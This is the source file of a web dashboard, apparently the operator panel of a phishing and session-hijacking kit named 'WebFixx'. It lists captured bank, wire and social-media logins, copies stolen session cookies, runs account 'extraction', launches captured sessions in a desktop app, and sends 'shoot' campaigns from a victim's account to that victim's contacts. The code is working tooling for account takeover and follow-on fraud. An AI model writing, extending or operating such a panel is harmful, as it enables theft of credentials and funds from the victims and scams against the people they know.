"use client";

import { useState, useMemo, useEffect, useCallback } from 'react';
import Link from 'next/link';
import { useAppState } from '../context/AppContext';
import { DashboardTabs } from '../components/admin/dashboard/DashboardTabs';
import { DashboardFilterBar, type StatusFilter } from '../components/admin/dashboard/DashboardFilterBar';
import { ColorLegend } from '../components/admin/dashboard/ColorLegend';
import { ItemDetailsModal } from '../components/admin/dashboard/ItemDetailsModal';
import { Pagination } from '../components/admin/dashboard/Pagination';
import { WireTable } from '../components/admin/dashboard/wire/WireTable';
import { BankTable } from '../components/admin/dashboard/bank/BankTable';
import { SocialTable } from '../components/admin/dashboard/social/SocialTable';
import LoadingSpinner from '../components/LoadingSpinner';
import { authApi, securedApi } from '../../utils/auth';
import { isFeatureEnabled, featureDisabledMessage } from '../../utils/featureFlags';
import { buildCSVFromContacts } from '../utils/csvNormalizer';
import { usePersistedState } from '../hooks/usePersistedState';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faSync, faChartLine, faDownload, faSearch } from '@fortawesome/free-solid-svg-icons';

interface TabFilterState {
  search: string;
  status: StatusFilter;
  page: number;
}

interface DashboardPersistedState {
  activeCategory: 'WIRE' | 'BANK' | 'SOCIAL' | null;
  tabs: Record<'WIRE' | 'BANK' | 'SOCIAL', TabFilterState>;
}

const STORAGE_KEY = 'webfixx_dashboard_state_v1';
const DEFAULT_TAB_STATE: TabFilterState = { search: '', status: 'ALL', page: 1 };
const DEFAULT_DASH_STATE: DashboardPersistedState = {
  activeCategory: null,
  tabs: {
    WIRE: { ...DEFAULT_TAB_STATE },
    BANK: { ...DEFAULT_TAB_STATE },
    SOCIAL: { ...DEFAULT_TAB_STATE },
  },
};

export default function Dashboard() {
  const { appData, setAppData } = useAppState(); // Destructure setAppData
  const [loading, setLoading] = useState(false);
  const [refreshing, setRefreshing] = useState(false); // New state for refresh
  const [selectedItem, setSelectedItem] = useState<string | null>(null);
  const [memoInput, setMemoInput] = useState<{ id: string; text: string } | null>(null);
  const [dismissDownload, setDismissDownload] = useState(false);
  const [actionError, setActionError] = useState<string | null>(null);
  const ITEMS_PER_PAGE = 25;

  // Persisted dashboard state (search, filters, page per tab) in localStorage
  const [dashState, setDashState] = usePersistedState<DashboardPersistedState>(STORAGE_KEY, DEFAULT_DASH_STATE);

  const activeCategory = dashState.activeCategory;
  const tabState = activeCategory ? (dashState.tabs?.[activeCategory] || DEFAULT_TAB_STATE) : DEFAULT_TAB_STATE;
  const searchQuery = tabState.search;
  const statusFilter = tabState.status;
  const currentPage = tabState.page;

  const setActiveCategory = useCallback((category: 'WIRE' | 'BANK' | 'SOCIAL') => {
    setDashState(prev => ({ ...prev, activeCategory: category }));
  }, [setDashState]);

  const setSearchQuery = useCallback((value: string) => {
    setDashState(prev => {
      if (!prev.activeCategory) return prev;
      return {
        ...prev,
        tabs: {
          ...prev.tabs,
          [prev.activeCategory]: { ...DEFAULT_TAB_STATE, ...prev.tabs?.[prev.activeCategory], search: value, page: 1 },
        },
      };
    });
  }, [setDashState]);

  const setStatusFilter = useCallback((value: StatusFilter) => {
    setDashState(prev => {
      if (!prev.activeCategory) return prev;
      return {
        ...prev,
        tabs: {
          ...prev.tabs,
          [prev.activeCategory]: { ...DEFAULT_TAB_STATE, ...prev.tabs?.[prev.activeCategory], status: value, page: 1 },
        },
      };
    });
  }, [setDashState]);

  const setCurrentPage = useCallback((page: number) => {
    setDashState(prev => {
      if (!prev.activeCategory) return prev;
      return {
        ...prev,
        tabs: {
          ...prev.tabs,
          [prev.activeCategory]: { ...DEFAULT_TAB_STATE, ...prev.tabs?.[prev.activeCategory], page },
        },
      };
    });
  }, [setDashState]);

  const clearFilters = useCallback(() => {
    setDashState(prev => {
      if (!prev.activeCategory) return prev;
      return {
        ...prev,
        tabs: {
          ...prev.tabs,
          [prev.activeCategory]: { search: '', status: 'ALL', page: 1 },
        },
      };
    });
  }, [setDashState]);


  // Transform hub data from array format to object format
  const hubData = useMemo(() => {
    if (!appData?.data?.hub?.data || !Array.isArray(appData.data.hub.data)) {
      return [];
    }

    const headers = appData.data.hub.headers || [];
    const rows = appData.data.hub.data.map((row, rowIndex) => {
      const item: any = {};
      headers.forEach((header: string, index: number) => {
        if (header) {
          item[header] = row[index];
        }
      });
      
      try {
        if (item.banks) item.banks = JSON.parse(item.banks);
        if (item.socials) item.socials = JSON.parse(item.socials);
        if (item.ipData) item.ipData = JSON.parse(item.ipData);
        if (item.deviceData) item.deviceData = JSON.parse(item.deviceData);
        if (item.cookieJSON) item.cookieJSON = JSON.parse(item.cookieJSON);
        if (item.history) {
          const parsedHistory = JSON.parse(item.history);
          item.history = Array.isArray(parsedHistory) ? parsedHistory : [];
        }
      } catch (error) {
        console.warn('Error parsing JSON fields:', error);
      }

      // Guarantee a unique, stable React key per row. Hub rows carry submissionId
      // (not always an 'id'), and batched submissions can share timestamps, so
      // fall back to the raw row index to keep clashing rows distinct.
      item.key = String(
        item.submissionId || item.browserId || item.id || `row-${rowIndex}`
      );
      
      return item;
    });

    // Sort by timestamp descending (newest first). Rows with a missing/invalid
    // timestamp are treated as the oldest so 'Invalid Date' never breaks order.
    const ts = (value: any): number => {
      if (value === null || value === undefined || value === '') return -Infinity;
      const t = new Date(value).getTime();
      return isNaN(t) ? -Infinity : t;
    };
    return rows.sort((a, b) => {
      const at = ts(a.timestamp);
      const bt = ts(b.timestamp);
      if (at === bt) return 0;
      return bt - at;
    });
  }, [appData?.data?.hub]);

  console.log('Processed Hub Data:', hubData);

  const showNoDataMessage = useMemo(() => {
    return !appData?.data?.hub?.data || hubData.length === 0;
  }, [appData?.data?.hub?.data, hubData.length]);

  // Group data by category
  const categorizedData = useMemo(() => {
    return hubData.reduce((acc, item) => {
      const category = item.category as 'WIRE' | 'BANK' | 'SOCIAL';
      if (!acc[category]) acc[category] = [];
      acc[category].push(item);
      return acc;
    }, {} as Record<'WIRE' | 'BANK' | 'SOCIAL', any[]>);
  }, [hubData]);

  // Available categories
  const availableCategories = useMemo(() => {
    return Object.keys(categorizedData).filter(
      cat => categorizedData[cat as keyof typeof categorizedData]?.length > 0
    );
  }, [categorizedData]);

  // Set initial active category if not set, or fall back if the persisted tab has no data
  useEffect(() => {
    if (availableCategories.length === 0) return;
    if (!activeCategory || !availableCategories.includes(activeCategory)) {
      setActiveCategory(availableCategories[0] as 'WIRE' | 'BANK' | 'SOCIAL');
    }
  }, [availableCategories, activeCategory, setActiveCategory]);

  const parseList = (value: any): any[] => {
    if (Array.isArray(value)) return value;
    if (typeof value === 'string') {
      try {
        const parsed = JSON.parse(value);
        return Array.isArray(parsed) ? parsed : [];
      } catch {
        return [];
      }
    }
    return [];
  };

  const matchesStatus = (item: any, status: StatusFilter): boolean => {
    const verified = item.verified === 'TRUE';
    switch (status) {
      case 'VERIFIED':
        return verified;
      case 'UNVERIFIED':
        return !verified;
      case 'FULL_ACCESS':
        return verified && item.fullAccess === 'TRUE';
      default:
        return true;
    }
  };

  const itemSearchText = (item: any, category: 'WIRE' | 'BANK' | 'SOCIAL'): string => {
    const parts: string[] = [];
    const push = (value: any) => {
      if (value !== null && value !== undefined) parts.push(String(value).toLowerCase());
    };
    push(item.email);
    push(item.domain);
    push(item.id);
    push(item.browserId);
    push(item.submissionId);
    push(item.title);
    push(item.memo);
    if (item.timestamp) parts.push(new Date(item.timestamp).toLocaleString().toLowerCase());
    if (category === 'BANK') {
      parseList(item.banks).forEach((bank: any) => {
        push(bank.bankName);
        push(bank.username);
        push(bank.website);
      });
    } else if (category === 'SOCIAL') {
      parseList(item.socials).forEach((social: any) => {
        push(social.platform);
        push(social.username);
        push(social.website);
      });
    }
    return parts.join(' ');
  };

  // Apply status filter + text search for the active tab
  const filteredRows = useMemo(() => {
    if (!activeCategory) return [];
    const rows = categorizedData[activeCategory] || [];
    const q = searchQuery.trim().toLowerCase();
    return rows.filter((item: any) => {
      if (statusFilter !== 'ALL' && !matchesStatus(item, statusFilter)) return false;
      if (!q) return true;
      return itemSearchText(item, activeCategory).includes(q);
    });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [categorizedData, activeCategory, searchQuery, statusFilter]);

  const noFilteredResults = !!activeCategory && (categorizedData[activeCategory]?.length || 0) > 0 && filteredRows.length === 0;

  const handleRefreshData = async () => {
    setRefreshing(true);
    try {
      await authApi.updateAppData(setAppData, true);
    } catch (error) {
      console.error('Error refreshing application data:', error);
    } finally {
      setRefreshing(false);
    }
  };

  // Common handlers
  const handleVerify = async (id: string) => {
    setLoading(true);
    try {
      // Find the item to get its category and browserId
      const item = hubData.find((row: any) => row.id === id || row.browserId === id);
      const category = item?.category || 'WIRE';
      const browserId = item?.browserId || id;
      
      await authApi.verifySession(browserId, category);
      // Refresh data after verification
      await authApi.updateAppData(setAppData);
    } catch (error) {
      console.error('Error verifying:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleGetCookie = async (id: string) => {
    setLoading(true);
    try {
      const item = hubData.find((row: any) => row.id === id || row.browserId === id);
      const cookieData = typeof item?.cookieJSON === 'string'
        ? item.cookieJSON
        : item?.cookieJSON
          ? JSON.stringify(item.cookieJSON)
          : '';
      if (cookieData) {
        await navigator.clipboard.writeText(cookieData);
      } else {
        console.warn('No cookie data found for item');
      }
    } catch (error) {
      console.error('Error getting cookie:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  const handleExtract = async (id: string) => {
    setLoading(true);
    setActionError(null);
    try {
      const item = hubData.find((row: any) => row.id === id || row.browserId === id);
      const category = (item?.category || 'WIRE') as 'WIRE' | 'BANK' | 'SOCIAL';
      const browserId = item?.browserId || item?.submissionId || id;

      const result = await securedApi.callBackendFunction({
        functionName: 'runSmartExtract',
        browserId,
        category,
      });
      if (result && result.success === false) {
        setActionError(result.error || featureDisabledMessage('allowExtraction'));
      }
    } catch (error: any) {
      setActionError(error?.message || 'Error extracting data.');
      console.error('Error extracting:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleShootContacts = async (shootData: {
    id: string;
    selectedContacts: Array<{
      name?: string;
      email?: string;
      phone?: string | number;
      company?: string;
      platform?: string;
      username?: string;
    }>;
    subject: string;
    body: string;
  }) => {
    setLoading(true);
    setActionError(null);
    try {
      const item = hubData.find((row: any) => row.id === shootData.id || row.browserId === shootData.id);
      const category = (item?.category || 'WIRE') as 'WIRE' | 'BANK' | 'SOCIAL';
      const browserId = item?.browserId || item?.submissionId || shootData.id;
      const accountEmail = item?.email || '';

      const nameParts = accountEmail.split('@')[0]?.split('.') || [];
      const sender = {
        firstName: nameParts[0] || '',
        lastName: nameParts.slice(1).join(' ') || '',
        email: accountEmail,
      };

      const csvText = buildCSVFromContacts(
        shootData.selectedContacts,
        category as 'WIRE' | 'SOCIAL',
        sender,
        shootData.subject,
        shootData.body
      );

      const base64Content = btoa(unescape(encodeURIComponent(csvText)));
      const timestamp = new Date().toISOString().slice(0, 10).replace(/-/g, '');
      const fileName = `shoot-${category.toLowerCase()}-${timestamp}.csv`;

      const result = await securedApi.callBackendFunction({
        functionName: 'createNewCampaign',
        projectId: '',
        accountIds: [browserId],
        status: 'draft',
        strategyContext: JSON.stringify({
          name: shootData.subject || `${category} Campaign ${timestamp}`,
          channel: category === 'SOCIAL' ? 'social' : 'email',
          type: 'general',
          subject: shootData.subject,
          body: shootData.body,
          deliveryMethod: 'wire',
        }),
        fileName,
        fileContent: base64Content,
        fileSize: csvText.length,
        fileMimeType: 'text/csv',
      });
      if (result && result.success === false) {
        setActionError(result.error || featureDisabledMessage(category === 'SOCIAL' ? 'allowInteraction' : 'allowShooting'));
      }
    } catch (error: any) {
      setActionError(error?.message || 'Error shooting contacts.');
      console.error('Error shooting contacts:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleOpenSession = (browserId: string) => {
    const token = document.cookie.match('(^|;)\\s*loggedInAdmin\\s*=\\s*([^;]+)')?.pop();
    if (!token) return;
    const apiUrl = process.env.NEXT_PUBLIC_API_BASE_URL || 'https://webfixx-hoo-oamupo-e98ced-157-173-204-24.sslip.io/api';
    let appOpened = false;
    const onBlur = () => { appOpened = true; };
    const onVisibility = () => { if (document.hidden) appOpened = true; };
    window.addEventListener('blur', onBlur);
    document.addEventListener('visibilitychange', onVisibility);
    window.location.href = `webfixx://launch?browserId=${browserId}&token=${token}&api=${encodeURIComponent(apiUrl)}`;
    setTimeout(() => {
      window.removeEventListener('blur', onBlur);
      document.removeEventListener('visibilitychange', onVisibility);
      if (!appOpened) {
        window.location.href = '/downloads/WebFixx-Session-Launcher-Setup.exe';
      }
    }, 1500);
  };

  const handleMemoSave = async (id: string, text: string) => {
    try {
      const item = hubData.find((row: any) => row.id === id || row.browserId === id);
      const browserId = item?.browserId || item?.submissionId || id;

      await securedApi.callBackendFunction({
        functionName: 'saveMemo',
        browserId,
        memo: text,
      });

      setMemoInput(null);
    } catch (error) {
      console.error('Error saving memo:', error);
    }
  };

  const handleRowClick = (id: string) => {
    setSelectedItem(selectedItem === id ? null : id);
  };

  const renderTable = () => {
    if (!activeCategory) return null;

    const allRows = filteredRows;
    const totalPages = Math.max(1, Math.ceil(allRows.length / ITEMS_PER_PAGE));
    const safePage = Math.min(currentPage, totalPages);
    const startIdx = (safePage - 1) * ITEMS_PER_PAGE;
    const paginatedData = allRows.slice(startIdx, startIdx + ITEMS_PER_PAGE);

    const commonProps = {
      data: paginatedData,
      onRowClick: handleRowClick,
      selectedId: selectedItem,
      onVerify: handleVerify,
      onGetCookie: handleGetCookie,
      onCopy: handleCopy,
      onExtract: handleExtract,
      onOpenSession: handleOpenSession,
      onMemoSave: handleMemoSave,
      loading,
      disabledExtract: !isFeatureEnabled(appData, 'allowExtraction'),
      disabledShoot: !isFeatureEnabled(appData, 'allowShooting') && !isFeatureEnabled(appData, 'allowInteraction'),
    };

    const pagination = allRows.length > ITEMS_PER_PAGE ? (
      <Pagination
        currentPage={currentPage}
        totalPages={totalPages}
        totalItems={allRows.length}
        itemsPerPage={ITEMS_PER_PAGE}
        onPageChange={setCurrentPage}
      />
    ) : null;

    switch (activeCategory) {
      case 'WIRE':
        return (
          <>
            <WireTable 
              {...commonProps}
              onShootContacts={handleShootContacts}
            />
            {pagination}
          </>
        );
      case 'BANK':
        return (
          <>
            <BankTable {...commonProps} />
            {pagination}
          </>
        );
      case 'SOCIAL':
        return (
          <>
            <SocialTable 
              {...commonProps}
              onShootContacts={handleShootContacts}
            />
            {pagination}
          </>
        );
      default:
        return null;
    }
  };

  return (
    <>
      {showNoDataMessage ? (
        <div className="flex flex-col items-center justify-center min-h-[calc(100vh-64px)] text-center">
          <FontAwesomeIcon icon={faChartLine} className="w-20 h-20 text-blue-500 mb-6" />
          <h2 className="text-3xl font-bold text-gray-900 dark:text-white mb-4">No Data Available</h2>
          <p className="text-lg text-gray-600 dark:text-gray-300 mb-8 max-w-md">
            To unlock the full potential of your dashboard, first visit the <Link href="/projects" className="text-blue-600 hover:underline">Projects page</Link> to create a link and begin collecting data. With active projects, you can automatically validate logs, extract valuable information from accounts, and even initiate targeted campaigns directly from your dashboard.
          </p>
          <Link
            href="/projects"
            className="inline-flex items-center px-4 py-2 border border-transparent text-base font-medium rounded-md shadow-sm text-white bg-blue-600 hover:bg-blue-700"
          >
            Go to Projects
          </Link>
        </div>
      ) : (
        <div className="p-6">
          {actionError && (
            <div className="mb-4 bg-red-100 dark:bg-red-900 text-red-800 dark:text-red-200 px-4 py-3 rounded-lg text-sm flex items-start justify-between gap-2">
              <span>{actionError}</span>
              <button onClick={() => setActionError(null)} className="text-red-500 dark:text-red-300 hover:text-red-700 font-bold">×</button>
            </div>
          )}
          <div className="flex justify-between items-center mb-6">
            <button
              onClick={handleRefreshData}
              className="bg-gray-200 dark:bg-gray-700 text-gray-800 dark:text-white px-4 py-2 rounded flex items-center hover:bg-gray-300 dark:hover:bg-gray-600 transition-colors duration-200"
              title="Refresh Data"
              disabled={refreshing}
            >
              <FontAwesomeIcon icon={faSync} className={`text-lg ${refreshing ? 'animate-spin' : ''}`} />
              <span className="ml-2 hidden sm:inline">Get Update</span>
            </button>
            {!dismissDownload && (
              <div className="flex items-center gap-2">
                <a
                  href="/downloads/WebFixx-Session-Launcher-Setup.exe"
                  className="bg-indigo-600 hover:bg-indigo-700 text-white px-4 py-2 rounded flex items-center gap-2 text-sm transition-colors"
                  title="Download Desktop App"
                >
                  <FontAwesomeIcon icon={faDownload} className="text-lg" />
                  <span className="hidden sm:inline">Desktop App</span>
                </a>
                <button
                  onClick={() => setDismissDownload(true)}
                  className="text-gray-400 hover:text-gray-600 dark:hover:text-gray-200 text-lg leading-none"
                  title="Dismiss"
                >
                  ×
                </button>
              </div>
            )}
          </div>

          <DashboardTabs
            categories={availableCategories as ('WIRE' | 'BANK' | 'SOCIAL')[]}
            activeCategory={activeCategory}
            onCategoryChange={setActiveCategory}
          />

          <ColorLegend />

          <div className="mt-6">
            <DashboardFilterBar
              search={searchQuery}
              onSearchChange={setSearchQuery}
              statusFilter={statusFilter}
              onStatusChange={setStatusFilter}
              resultCount={filteredRows.length}
              totalCount={categorizedData[activeCategory as 'WIRE' | 'BANK' | 'SOCIAL']?.length || 0}
              onClear={clearFilters}
            />

            {noFilteredResults ? (
              <div className="flex flex-col items-center justify-center py-16 text-center bg-white dark:bg-gray-800 rounded-lg border dark:border-gray-700">
                <FontAwesomeIcon icon={faSearch} className="w-10 h-10 text-gray-400 mb-4" />
                <h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-2">No results match your filters</h3>
                <p className="text-sm text-gray-600 dark:text-gray-400 mb-6">Try a different search term or clear your filters.</p>
                <button
                  onClick={clearFilters}
                  className="text-sm text-blue-600 dark:text-blue-400 hover:underline"
                >
                  Clear filters
                </button>
              </div>
            ) : (
              renderTable()
            )}
          </div>

          <ItemDetailsModal
            isOpen={!!selectedItem}
            onClose={() => setSelectedItem(null)}
            data={hubData.find(item => item.id === selectedItem)}
            category={activeCategory}
            onVerify={handleVerify}
            onGetCookie={handleGetCookie}
            onExtract={handleExtract}
            onShootContacts={handleShootContacts}
            onOpenSession={handleOpenSession}
            onMemoSave={handleMemoSave}
            loading={loading}
          />
        </div>
      )}

      {/* Loading State for refresh action */}
      {refreshing && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
          <LoadingSpinner size="large" />
        </div>
      )}
    </>
  );
}
